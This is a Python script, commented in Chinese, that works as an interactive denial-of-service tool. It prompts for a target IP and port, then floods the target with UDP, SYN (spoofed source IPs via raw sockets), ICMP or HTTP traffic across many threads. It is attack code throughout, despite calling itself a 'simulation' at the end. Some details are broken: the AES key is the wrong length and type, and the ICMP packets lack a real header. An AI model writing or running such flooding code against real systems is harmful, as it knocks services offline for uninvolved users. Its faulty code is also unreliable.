import socket
import threading
import requests
import os
import struct
import secrets
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
from Crypto.Cipher import AES
import base64
import hashlib

# 获取用户输入的目标信息
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))

# 获取攻击参数
requests_per_thread = int(input("Enter the number of requests per thread: "))
number_of_threads = int(input("Enter the number of threads: "))
memory_size = int(input("Enter the memory size (bytes) for each packet: "))

# 获取用户选择的攻击方法
print("Select attack method:")
print("1. UDP Flood")
print("2. SYN Flood with IP Spoofing")
print("3. ICMP Flood")
print("4. HTTP Flood with Encrypted Data")
attack_choice = input("Enter the number corresponding to the attack method: ")

if attack_choice == "1":
    attack_method = "UDP"
elif attack_choice == "2":
    attack_method = "SYN"
elif attack_choice == "3":
    attack_method = "ICMP"
elif attack_choice == "4":
    attack_method = "HTTP"
else:
    print("Invalid choice. Exiting.")
    exit()

# 生成伪造IP地址的函数（使用哈希）
def generate_spoofed_ip(base_ip):
    hash_object = hashlib.sha256(base_ip.encode())
    hashed_ip = hash_object.hexdigest()[:8]  # 取前8个字符作为IP地址的一部分
    octets = [str(int(hashed_ip[i:i+2], 16)) for i in range(0, 8, 2)]
    spoofed_ip = f"{octets[0]}.{octets[1]}.{octets[2]}.{octets[3]}"
    return spoofed_ip

# 加密数据的函数（AES加密）
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = data + (16 - len(data) % 16) * ' '  # 补齐至16字节
    encrypted = cipher.encrypt(padded_data.encode())
    return base64.b64encode(encrypted).decode()

# 创建IP头部和TCP头部
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(src_ip, dst_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20  # IP header + TCP header
    ip_id = 54321  # Id of this packet
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0    # kernel will fill the correct checksum
    ip_saddr = socket.inet_aton(src_ip)  # Spoof the source IP address
    ip_daddr = socket.inet_aton(dst_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s', 
                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    return ip_header

def create_tcp_header_fixed(src_port, dst_port):
    tcp_source = src_port
    tcp_dest = dst_port
    tcp_seq = 454
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + \
                (tcp_ack << 4) + (tcp_urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                             tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    return tcp_header

# 各类攻击函数
def udp_flood():
    message = b'X' * memory_size
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(requests_per_thread):
        try:
            sock.sendto(message, (target_ip, target_port))
            print("UDP packet sent")
        except Exception as e:
            print(f"UDP send failed: {e}")

def syn_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    tcp_header = create_tcp_header_fixed(1234, target_port)
    
    for _ in range(requests_per_thread):
        src_ip = generate_spoofed_ip(f"192.168.1.{secrets.randbelow(255)}")
        ip_header = create_ip_header(src_ip, target_ip)
        packet = ip_header + tcp_header
        try:
            sock.sendto(packet, (target_ip, 0))
            print(f"SYN packet sent with spoofed IP {src_ip}")
        except Exception as e:
            print(f"SYN send failed: {e}")

def icmp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_packet = os.urandom(memory_size)
    for _ in range(requests_per_thread):
        try:
            sock.sendto(icmp_packet, (target_ip, target_port))
            print("ICMP packet sent")
        except Exception as e:
            print(f"ICMP send failed: {e}")

async def http_flood_async():
    url = f"http://{target_ip}:{target_port}/"
    encryption_key = 'thisisaverysecretkey'  # 16字节密钥
    encrypted_data = encrypt_data("Sensitive Data", encryption_key)
    
    async with aiohttp.ClientSession() as session:
        for _ in range(requests_per_thread):
            try:
                async with session.get(url, params={"data": encrypted_data}, timeout=1) as response:
                    print(f"HTTP request sent: {response.status}")
            except Exception as e:
                print(f"HTTP request failed: {e}")

async def main_http_flood():
    tasks = [http_flood_async() for _ in range(number_of_threads)]
    await asyncio.gather(*tasks)

def start_attack(attack_function, number_of_threads):
    with ThreadPoolExecutor(max_workers=number_of_threads) as executor:
        futures = [executor.submit(attack_function) for _ in range(number_of_threads)]
        for future in futures:
            future.result()

# 启动攻击
if attack_method == "UDP":
    start_attack(udp_flood, number_of_threads)
elif attack_method == "SYN":
    start_attack(syn_flood, number_of_threads)
elif attack_method == "ICMP":
    start_attack(icmp_flood, number_of_threads)
elif attack_method == "HTTP":
    asyncio.run(main_http_flood())

print(f"{attack_method} attack simulation completed.")
